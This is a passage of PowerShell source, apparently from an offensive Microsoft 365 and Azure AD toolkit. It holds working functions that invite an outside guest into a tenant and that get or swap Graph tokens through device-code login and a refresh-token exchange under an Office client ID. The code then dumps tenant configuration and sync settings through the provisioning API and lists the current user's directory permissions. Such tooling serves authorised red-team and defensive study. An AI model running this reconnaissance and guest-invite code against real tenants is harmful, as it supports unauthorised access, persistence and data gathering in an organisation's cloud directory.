            Write-Host "Provisioning Options: $($response.resourceProvisioningOptions -join ', ')" 
        }
        if ($response.resourceBehaviorOptions){
            Write-Host "Behavior Options: $($response.resourceBehaviorOptions -join ',')" 
        }
        Write-Host "-----------------------------"
    }
}


function Invoke-InviteGuest{

<#
    .SYNOPSIS
        Invites a guest user to an Azure Active Directory tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        Invites a guest user to an Azure Active Directory tenant.

    .PARAMETER Tokens

        Token object for auth

    .PARAMETER DisplayName
    
        The name you want displayed in the Azure directory for the user (ex. "Beau Bullock")
        
    .PARAMETER EmailAddress
    
        The email address of the user you want to invite
        
    .PARAMETER RedirectUrl 
    
        A redirect url that you want to redirect the guest to upon accepting the invite. Leave blank to use the default
        
    .PARAMETER SendInvitationMessage
    
        Option to send an email to the invited user or not
        
    .PARAMETER CustomMessageBody
    
        Change the message body sent in the invite 

    .EXAMPLES      
        
        C:\PS> Invoke-InviteGuest -Tokens $tokens -DisplayName "Lord Voldemort" -EmailAddress "iamlordvoldemort@31337schoolofhackingandwizardry.com"
#>

    Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [string]
    $DisplayName = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $EmailAddress = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $RedirectUrl = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $SendInvitationMessage = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $CustomMessageBody = "",

    [Parameter(Position = 5, Mandatory = $False)]
    [object[]]
    $Tokens = ""

    )
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 
    $headers = @{"Authorization" = "Bearer $accesstoken"}
    # Construct the Graph API endpoint
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
    $tenantid = $orginfo.value.id


    # Prompt user for input
    if(!$EmailAddress){
    $EmailAddress = Read-Host "Enter the Email Address to Invite"
    }

    if(!$DisplayName){
    $DisplayName = Read-Host "Enter the Display Name"
    }

    if(!$RedirectUrl){
    $RedirectUrl = Read-Host "Enter the Redirect URI (leave blank to use the default)"
    }
    if($RedirectUrl -eq ""){
    $RedirectUrl = ("https://myapplications.microsoft.com/?tenantid=" + $tenantid)
    }

    if(!$SendInvitationMessage){
    $SendInvitationMessage = Read-Host "Send an Email Invitation? (true/false)"
    }

    if (!$CustomMessageBody){
    $CustomMessageBody = Read-Host "Enter a custom message body or leave blank"
    }

    # Construct the JSON payload
    $invitationData = @{
        invitedUserEmailAddress = $EmailAddress
        invitedUserDisplayname = $Displayname
        inviteRedirectUrl = $RedirectUrl
        sendInvitationMessage = [System.Convert]::ToBoolean($SendInvitationMessage)
        invitedUserMessageInfo = @{
            customizedMessageBody = $MessageBody
        }
    }

    # Convert to JSON format
    $invitationJson = $invitationData | ConvertTo-Json


    # Make the POST request
    $response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/invitations" -Method Post -Headers $headers -Body $invitationJson

    # Check the response
    if ($response -ne $null) {
        Write-Host -ForegroundColor Green "[*] External user invited sent successfully."
        Write-Host ("Display Name: " + $response.invitedUserDisplayName)
        Write-Host ("Email Address: " + $response.invitedUserEmailAddress)
        Write-Host ("Object ID: " + $response.invitedUser.id)
        Write-Host ("Invite Redeem URL: " +  $response.inviteRedeemUrl)
    } else {
        Write-Error "Error sending invitation."
    }
}



function Invoke-GraphRecon{

    <#
        .SYNOPSIS
            PowerShell module to perform general recon via the Azure AD Graph API.
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
           PowerShell module to perform general recon via the Azure AD Graph API.

        .PARAMETER PermissionEnum
           
            Enumerates individual permissions for the current user.

        .EXAMPLES      
        
            C:\PS> Invoke-GraphRecon -Tokens $tokens -PermissionEnum
    #>

    param(
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = "",
        [switch]
        $GraphRun,
        [switch]
        $PermissionEnum
    )
    if($Tokens){
        if(!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
            Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
        }
        
        $RefreshToken = $tokens.refresh_token
        $authUrl = "https://login.microsoftonline.com/$tenantid"
        $refreshbody = @{
                "resource" = "https://graph.windows.net"
                "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "grant_type" =    "refresh_token"
                "refresh_token" = $RefreshToken
                "scope"=         "user_impersonation"
            }

    try{
    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Body $refreshbody
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    Write-Output $details.error
    }
    if($reftokens)
            {
               $aadtokens = $reftokens
               $access_token = $aadtokens.access_token
            }
    }
    else{

    # Login
        Write-Host -ForegroundColor yellow "[*] Initiating a device code login."

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.windows.net"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
            "scope" = "user_impersonation"
        }
        try{
        $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($aadtokens)
            {
                Write-Host "[*] Successful auth"
                $access_token = $aadtokens.access_token
                break
            }
        Start-Sleep -Seconds 3
    }
    }

    # Generate unique GUIDs
    $messageId = [guid]::NewGuid()
    $trackingHeader = [guid]::NewGuid()
    $clientId = "50afce61-c917-435b-8c6d-60aa5a8b8aa7"



$soapRequest = @"
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/MsolConnect</a:Action>
    <a:MessageID>urn:uuid:$messageId</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$access_token</BearerToken>
      <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
    </UserIdentityHeader>
    <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$clientId</ClientId>
      <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.57</Version>
    </ClientVersionHeader>
    <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
    </ContractVersionHeader>
    <TrackingHeader xmlns="http://becwebservice.microsoftonline.com/">$trackingHeader</TrackingHeader>
    <a:To s:mustUnderstand="1">https://provisioningapi.microsoftonline.com/provisioningwebservice.svc</a:To>
  </s:Header>
  <s:Body>
    <MsolConnect xmlns="http://provisioning.microsoftonline.com/">
      <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
        <b:BecVersion>Version4</b:BecVersion>
        <b:TenantId i:nil="true"/>
        <b:VerifiedDomain i:nil="true"/>
      </request>
    </MsolConnect>
  </s:Body>
</s:Envelope>
"@

    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Now trying to query the MS provisioning API for organization settings."
    }
    # Send the SOAP request to the provisioningwebservice
    $response = Invoke-WebRequest -UseBasicParsing -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $soapRequest


    if ($response -match '<DataBlob[^>]*>(.*?)<\/DataBlob>') {
        $dataBlob = $Matches[1]
    } else {
        Write-Host "DataBlob not found in the response."
    }

    $messageID = [guid]::NewGuid()
    $trackingHeader = [guid]::NewGuid()

$GetCompanyInfoSoapRequest = @"
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/GetCompanyInformation</a:Action>
    <a:MessageID>$MessageID</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Bearer $access_token</BearerToken>
      <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
    </UserIdentityHeader>
    <BecContext xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <DataBlob xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$dataBlob</DataBlob>
      <PartitionId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">70</PartitionId>
    </BecContext>
    <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$ClientId</ClientId>
      <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.57</Version>
    </ClientVersionHeader>
    <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
    </ContractVersionHeader>
    <TrackingHeader xmlns="http://becwebservice.microsoftonline.com/">$TrackingHeader</TrackingHeader>
    <a:To s:mustUnderstand="1">https://provisioningapi.microsoftonline.com/provisioningwebservice.svc</a:To>
  </s:Header>
  <s:Body>
    <GetCompanyInformation xmlns="http://provisioning.microsoftonline.com/">
      <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
        <b:BecVersion>Version16</b:BecVersion>
        <b:TenantId i:nil="true"/>
        <b:VerifiedDomain i:nil="true"/>
      </request>
    </GetCompanyInformation>
  </s:Body>
</s:Envelope>
"@

    $companyinfo = Invoke-WebRequest -UseBasicParsing -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $GetCompanyInfoSoapRequest


    $xml = [xml]$companyInfo

    # Define namespaces
    $ns = New-Object Xml.XmlNamespaceManager($xml.NameTable)
    $ns.AddNamespace("s", "http://www.w3.org/2003/05/soap-envelope")
    $ns.AddNamespace("b", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService")
    $ns.AddNamespace("c", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration")
    $ns.AddNamespace("d", "http://schemas.microsoft.com/2003/10/Serialization/Arrays")
    $ns.AddNamespace("ns", "http://schemas.microsoft.com/online/serviceextensions/2009/08/ExtensibilitySchema.xsd")


    # Extract data using XPath
    $displayName = $xml.SelectSingleNode("//c:DisplayName", $ns).InnerText
    $street = $xml.SelectSingleNode("//c:Street", $ns).InnerText
    $city = $xml.SelectSingleNode("//c:City", $ns).InnerText
    $state = $xml.SelectSingleNode("//c:State", $ns).InnerText
    $postalCode = $xml.SelectSingleNode("//c:PostalCode", $ns).InnerText
    $Country = $xml.SelectSingleNode("//c:CountryLetterCode", $ns).InnerText
    $TechnicalContact = $xml.SelectSingleNode("//c:TechnicalNotificationEmails", $ns).InnerText
    $Telephone = $xml.SelectSingleNode("//c:TelephoneNumber", $ns).InnerText
    $InitialDomain = $xml.SelectSingleNode("//c:InitialDomain", $ns).InnerText
    $DirSync = $xml.SelectSingleNode("//c:DirectorySynchronizationEnabled", $ns).InnerText
    $DirSyncStatus = $xml.SelectSingleNode("//c:DirectorySynchronizationStatus", $ns).InnerText
    $DirSyncClientMachine = $xml.SelectSingleNode("//c:DirSyncClientMachineName", $ns).InnerText
    $DirSyncServiceAccount = $xml.SelectSingleNode("//c:DirSyncServiceAccount", $ns).InnerText
    $PasswordSync = $xml.SelectSingleNode("//c:PasswordSynchronizationEnabled", $ns).InnerText
    $PasswordReset = $xml.SelectSingleNode("//c:SelfServePasswordResetEnabled", $ns).InnerText
    $UsersPermToConsent = $xml.SelectSingleNode("//c:UsersPermissionToUserConsentToAppEnabled", $ns).InnerText
    $UsersPermToReadUsers = $xml.SelectSingleNode("//c:UsersPermissionToReadOtherUsersEnabled", $ns).InnerText
    $UsersPermToCreateLOBApps = $xml.SelectSingleNode("//c:UsersPermissionToCreateLOBAppsEnabled", $ns).InnerText
    $UsersPermToCreateGroups = $xml.SelectSingleNode("//c:UsersPermissionToCreateGroupsEnabled", $ns).InnerText

    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    Write-Host -ForegroundColor Yellow "Main Contact Info"
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    # Display the extracted data
    Write-Output "Display Name: $displayName"
    Write-Output "Street: $street"
    Write-Output "City: $city"
    Write-Output "State: $state"
    Write-Output "Postal Code: $postalCode"
    Write-Output "Country: $country"
    Write-Output "Technical Notification Email: $TechnicalContact"
    Write-Output "Telephone Number: $Telephone"
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    Write-Host -ForegroundColor Yellow "Directory Sync Settings"
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    Write-Output "Initial Domain: $initialDomain"
    Write-Output "Directory Sync Enabled: $dirSync"
    Write-Output "Directory Sync Status: $dirSyncStatus"
    Write-Output "Directory Sync Client Machine: $dirSyncClientMachine"
    Write-Output "Directory Sync Service Account: $dirSyncServiceAccount"
    Write-Output "Password Sync Enabled: $passwordSync"
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    Write-Host -ForegroundColor Yellow "User Settings"
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    Write-Output "Self-Service Password Reset Enabled: $passwordReset"
    Write-Output "Users Can Consent to Apps: $UsersPermToConsent"
    Write-Output "Users Can Read Other Users: $UsersPermToReadUsers"
    Write-Output "Users Can Create Apps: $UsersPermToCreateLOBApps"
    Write-Output "Users Can Create Groups: $UsersPermToCreateGroups"


    # Select the ServiceParameter nodes
    $serviceParameters = $xml.SelectNodes("//ns:ServiceParameter", $ns)
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    Write-Host -ForegroundColor Yellow "Additional Service Parameters"
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    # Loop through each ServiceParameter node and extract the Name and Value
    foreach ($parameter in $serviceParameters) {
        $name = $parameter.Name
        $value = $parameter.Value
        Write-Output "$name : $value"
    }
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }
    $accesstoken = $tokens.access_token
    $refreshtoken = $tokens.refresh_token
        
    $graphApiEndpoint = "https://graph.microsoft.com/v1.0/me"
    $estimateAccessEndpoint = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess"
    $authpolicyEndpoint = "https://graph.microsoft.com/beta/policies/authorizationPolicy "

    $headers = @{
        "Authorization" = "Bearer $accessToken"
        "Content-Type" = "application/json"
    }
    


    try {
        $authpolicy = Invoke-RestMethod -Uri $authpolicyEndpoint -Headers $headers -Method Get
        if(!$GraphRun){
        Write-Host -ForegroundColor Yellow "Authorization Policy Info"
        Write-Host -ForegroundColor Yellow ("=" * 80) 
        }
        # Display the extracted data
        Write-Output ("Allowed to create app registrations (Default User Role Permissions): " + $authpolicy.value.defaultUserRolePermissions.allowedToCreateApps)
        Write-Output ("Allowed to create security groups (Default User Role Permissions): " + $authpolicy.value.defaultUserRolePermissions.allowedToCreateSecurityGroups)
        Write-Output ("Allowed to create tenants (Default User Role Permissions): " + $authpolicy.value.defaultUserRolePermissions.allowedToCreateTenants)
        Write-Output ("Allowed to read Bitlocker keys for own device (Default User Role Permissions): " + $authpolicy.value.defaultUserRolePermissions.allowedToReadBitlockerKeysForOwnedDevice)
        Write-Output ("Allowed to read other users (Default User Role Permissions): " + $authpolicy.value.defaultUserRolePermissions.allowedToReadOtherUsers)
        Write-Output ("Who can invite external users to the organization: " + $authpolicy.value.allowInvitesFrom)
        Write-Output ("Users can sign up for email based subscriptions: " + $authpolicy.value.allowedToSignUpEmailBasedSubscriptions)
        Write-Output ("Users can use the Self-Serve Password Reset: " + $authpolicy.value.allowedToUseSSPR)
        Write-Output ("Users can join the tenant by email validation: " + $authpolicy.value.allowEmailVerifiedUsersToJoinOrganization)
        Write-Output ("Users can consent to risky apps: " + $authpolicy.value.allowUserConsentForRiskyApps)
        Write-Output ("Block MSOL PowerShell: " + $authpolicy.value.blockMsolPowerShell)
        Write-Output ("Guest User Role Template ID: " + $authpolicy.value.guestUserRoleId)
        if ($authpolicy.value.guestUserRoleId -eq "a0b1b346-4d3e-4e8b-98f8-753987be4970"){Write-Output "Guest User Policy: Guest users have the same access as members (most inclusive)"}
        if ($authpolicy.value.guestUserRoleId -eq "10dae51f-b6af-4016-8d66-8c2a99b929b3"){Write-Output "Guest User Policy: Guest users have limited access to properties and memberships of directory objects"}
        if ($authpolicy.value.guestUserRoleId -eq "2af84b1e-32c8-42b7-82bc-daa82404023b"){Write-Output "Guest User Policy: Guest user access is restricted to properties and memberships of their own directory objects (most restrictive)"}
        
    }
    catch {
        Write-Host -ForegroundColor Red "Error fetching user information: $_"
    }


    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow ("=" * 80) 
    }

    if($PermissionEnum){
        Write-Host -ForegroundColor yellow "[*] Now enumerating individual permissions for the current user"

        try {
            $me = Invoke-RestMethod -Uri $graphApiEndpoint -Headers $headers -Method Get
            $results = @()
            $userid = ("/" + $me.id)

            # Permission list pulled from https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference

            $resourceActions = @{
                "microsoft.directory/adminConsentRequestPolicy/allProperties/allTasks" = "Manage admin consent request policies in Microsoft Entra ID"
                "microsoft.directory/appConsent/appConsentRequests/allProperties/read" = "Read all properties of consent requests for applications registered with Microsoft Entra ID"
                "microsoft.directory/applications/create" = "Create all types of applications"
                "microsoft.directory/applications/createAsOwner" = "Create all types of applications, and creator is added as the first owner"
                "microsoft.directory/oAuth2PermissionGrants/createAsOwner" = "Create OAuth 2.0 permission grants, with creator as the first owner"
                "microsoft.directory/servicePrincipals/createAsOwner" = "Create service principals, with creator as the first owner"
                "microsoft.directory/applications/delete" = "Delete all types of applications"
                "microsoft.directory/applications/applicationProxy/read" = "Read all application proxy properties"
                "microsoft.directory/applications/applicationProxy/update" = "Update all application proxy properties"
                "microsoft.directory/applications/applicationProxyAuthentication/update" = "Update authentication on all types of applications"
                "microsoft.directory/applications/applicationProxySslCertificate/update" = "Update SSL certificate settings for application proxy"
                "microsoft.directory/applications/applicationProxyUrlSettings/update" = "Update URL settings for application proxy"
                "microsoft.directory/applications/appRoles/update" = "Update the appRoles property on all types of applications"
                "microsoft.directory/applications/audience/update" = "Update the audience property for applications"
                "microsoft.directory/applications/authentication/update" = "Update authentication on all types of applications"
                "microsoft.directory/applications/basic/update" = "Update basic properties for applications"
                "microsoft.directory/applications/credentials/update" = "Update application credentials"
                "microsoft.directory/applications/extensionProperties/update" = "Update extension properties on applications"
                "microsoft.directory/applications/notes/update" = "Update notes of applications"
                "microsoft.directory/applications/owners/update" = "Update owners of applications"
                "microsoft.directory/applications/permissions/update" = "Update exposed permissions and required permissions on all types of applications"
                "microsoft.directory/applications/policies/update" = "Update policies of applications"
                "microsoft.directory/applications/tag/update" = "Update tags of applications"
                "microsoft.directory/applications/verification/update" = "Update applications verification property"
                "microsoft.directory/applications/synchronization/standard/read" = "Read provisioning settings associated with the application object"
                "microsoft.directory/applicationTemplates/instantiate" = "Instantiate gallery applications from application templates"
                "microsoft.directory/auditLogs/allProperties/read" = "Read all properties on audit logs, excluding custom security attributes audit logs"
                "microsoft.directory/connectors/create" = "Create application proxy connectors"
                "microsoft.directory/connectors/allProperties/read" = "Read all properties of application proxy connectors"
                "microsoft.directory/connectorGroups/create" = "Create application proxy connector groups"
                "microsoft.directory/connectorGroups/delete" = "Delete application proxy connector groups"
                "microsoft.directory/connectorGroups/allProperties/read" = "Read all properties of application proxy connector groups"
                "microsoft.directory/connectorGroups/allProperties/update" = "Update all properties of application proxy connector groups"
                "microsoft.directory/customAuthenticationExtensions/allProperties/allTasks" = "Create and manage custom authentication extensions"
                "microsoft.directory/deletedItems.applications/delete" = "Permanently delete applications, which can no longer be restored"
                "microsoft.directory/deletedItems.applications/restore" = "Restore soft deleted applications to original state"
                "microsoft.directory/oAuth2PermissionGrants/allProperties/allTasks" = "Create and delete OAuth 2.0 permission grants, and read and update all properties"
                "microsoft.directory/applicationPolicies/create" = "Create application policies"
                "microsoft.directory/applicationPolicies/delete" = "Delete application policies"
                "microsoft.directory/applicationPolicies/standard/read" = "Read standard properties of application policies"
                "microsoft.directory/applicationPolicies/owners/read" = "Read owners on application policies"
                "microsoft.directory/applicationPolicies/policyAppliedTo/read" = "Read application policies applied to objects list"
                "microsoft.directory/applicationPolicies/basic/update" = "Update standard properties of application policies"
                "microsoft.directory/applicationPolicies/owners/update" = "Update the owner property of application policies"
                "microsoft.directory/provisioningLogs/allProperties/read" = "Read all properties of provisioning logs"
                "microsoft.directory/servicePrincipals/create" = "Create service principals"
                "microsoft.directory/servicePrincipals/delete" = "Delete service principals"
                "microsoft.directory/servicePrincipals/disable" = "Disable service principals"
                "microsoft.directory/servicePrincipals/enable" = "Enable service principals"
                "microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials" = "Manage password single sign-on credentials on service principals"
                "microsoft.directory/servicePrincipals/synchronizationCredentials/manage" = "Manage application provisioning secrets and credentials"
                "microsoft.directory/servicePrincipals/synchronizationJobs/manage" = "Start, restart, and pause application provisioning synchronization jobs"
                "microsoft.directory/servicePrincipals/synchronizationSchema/manage" = "Create and manage application provisioning synchronization jobs and schema"
                "microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials" = "Read password single sign-on credentials on service principals"
                "microsoft.directory/servicePrincipals/managePermissionGrantsForAll.microsoft-application-admin" = "Grant consent for application permissions and delegated permissions on behalf of any user or all users, except for application permissions for Microsoft Graph"
                "microsoft.directory/servicePrincipals/appRoleAssignedTo/update" = "Update service principal role assignments"
                "microsoft.directory/servicePrincipals/audience/update" = "Update audience properties on service principals"
                "microsoft.directory/servicePrincipals/authentication/update" = "Update authentication properties on service principals"
                "microsoft.directory/servicePrincipals/basic/update" = "Update basic properties on service principals"
                "microsoft.directory/servicePrincipals/credentials/update" = "Update credentials of service principals"
                "microsoft.directory/servicePrincipals/notes/update" = "Update notes of service principals"
                "microsoft.directory/servicePrincipals/owners/update" = "Update owners of service principals"
                "microsoft.directory/servicePrincipals/permissions/update" = "Update permissions of service principals"
                "microsoft.directory/servicePrincipals/policies/update" = "Update policies of service principals"
                "microsoft.directory/servicePrincipals/tag/update" = "Update the tag property for service principals"
                "microsoft.directory/servicePrincipals/synchronization/standard/read" = "Read provisioning settings associated with your service principal"
                "microsoft.directory/signInReports/allProperties/read" = "Read all properties on sign-in reports, including privileged properties"
                "microsoft.azure.serviceHealth/allEntities/allTasks" = "Read and configure Azure Service Health"
                "microsoft.azure.supportTickets/allEntities/allTasks" = "Create and manage Azure support tickets"
                "microsoft.office365.serviceHealth/allEntities/allTasks" = "Read and configure Service Health in the Microsoft 365 admin center"
                "microsoft.office365.supportTickets/allEntities/allTasks" = "Create and manage Microsoft 365 service requests"
                "microsoft.office365.webPortal/allEntities/standard/read" = "Read basic properties on all resources in the Microsoft 365 admin center"
                "microsoft.directory/administrativeUnits/standard/read" = "Read basic properties on administrative units"
                "microsoft.directory/administrativeUnits/members/read" = "Read members of administrative units"
                "microsoft.directory/applications/standard/read" = "Read standard properties of applications"
                "microsoft.directory/applications/owners/read" = "Read owners of applications"
                "microsoft.directory/applications/policies/read" = "Read policies of applications"
                "microsoft.directory/contacts/standard/read" = "Read basic properties on contacts in Microsoft Entra ID"
                "microsoft.directory/contacts/memberOf/read" = "Read the group membership for all contacts in Microsoft Entra ID"
                "microsoft.directory/contracts/standard/read" = "Read basic properties on partner contracts"
                "microsoft.directory/devices/standard/read" = "Read basic properties on devices"
                "microsoft.directory/devices/memberOf/read" = "Read device memberships"
                "microsoft.directory/devices/registeredOwners/read" = "Read registered owners of devices"
                "microsoft.directory/devices/registeredUsers/read" = "Read registered users of devices"
                "microsoft.directory/directoryRoles/standard/read" = "Read basic properties in Microsoft Entra roles"
                "microsoft.directory/directoryRoles/eligibleMembers/read" = "Read the eligible members of Microsoft Entra roles"
                "microsoft.directory/directoryRoles/members/read" = "Read all members of Microsoft Entra roles"
                "microsoft.directory/domains/standard/read" = "Read basic properties on domains"
                "microsoft.directory/groups/standard/read" = "Read standard properties of Security groups and Microsoft 365 groups, including role-assignable groups"
                "microsoft.directory/groups/appRoleAssignments/read" = "Read application role assignments of groups"
                "microsoft.directory/groups/memberOf/read" = "Read the memberOf property on Security groups and Microsoft 365 groups, including role-assignable groups"
                "microsoft.directory/groups/members/read" = "Read members of Security groups and Microsoft 365 groups, including role-assignable groups"
                "microsoft.directory/groups/owners/read" = "Read owners of Security groups and Microsoft 365 groups, including role-assignable groups"
                "microsoft.directory/groups/settings/read" = "Read settings of groups"
                "microsoft.directory/groupSettings/standard/read" = "Read basic properties on group settings"
                "microsoft.directory/groupSettingTemplates/standard/read" = "Read basic properties on group setting templates"
                "microsoft.directory/oAuth2PermissionGrants/standard/read" = "Read basic properties on OAuth 2.0 permission grants"
                "microsoft.directory/organization/standard/read" = "Read basic properties on an organization"
                "microsoft.directory/organization/trustedCAsForPasswordlessAuth/read" = "Read trusted certificate authorities for passwordless authentication"
                "microsoft.directory/roleAssignments/standard/read" = "Read basic properties on role assignments"
                "microsoft.directory/roleDefinitions/standard/read" = "Read basic properties on role definitions"
                "microsoft.directory/servicePrincipals/appRoleAssignedTo/read" = "Read service principal role assignments"
                "microsoft.directory/servicePrincipals/appRoleAssignments/read" = "Read role assignments assigned to service principals"
                "microsoft.directory/servicePrincipals/standard/read" = "Read basic properties of service principals"
                "microsoft.directory/servicePrincipals/memberOf/read" = "Read the group memberships on service principals"
                "microsoft.directory/servicePrincipals/oAuth2PermissionGrants/read" = "Read delegated permission grants on service principals"
                "microsoft.directory/servicePrincipals/owners/read" = "Read owners of service principals"
                "microsoft.directory/servicePrincipals/ownedObjects/read" = "Read owned objects of service principals"
                "microsoft.directory/servicePrincipals/policies/read" = "Read policies of service principals"
                "microsoft.directory/subscribedSkus/standard/read" = "Read basic properties on subscriptions"
                "microsoft.directory/users/standard/read" = "Read basic properties on users"
                "microsoft.directory/users/appRoleAssignments/read" = "Read application role assignments for users"
                "microsoft.directory/users/deviceForResourceAccount/read" = "Read deviceForResourceAccount of users"
                "microsoft.directory/users/directReports/read" = "Read the direct reports for users"
                "microsoft.directory/users/licenseDetails/read" = "Read license details of users"
                "microsoft.directory/users/manager/read" = "Read manager of users"
                "microsoft.directory/users/memberOf/read" = "Read the group memberships of users"
                "microsoft.directory/users/oAuth2PermissionGrants/read" = "Read delegated permission grants on users"
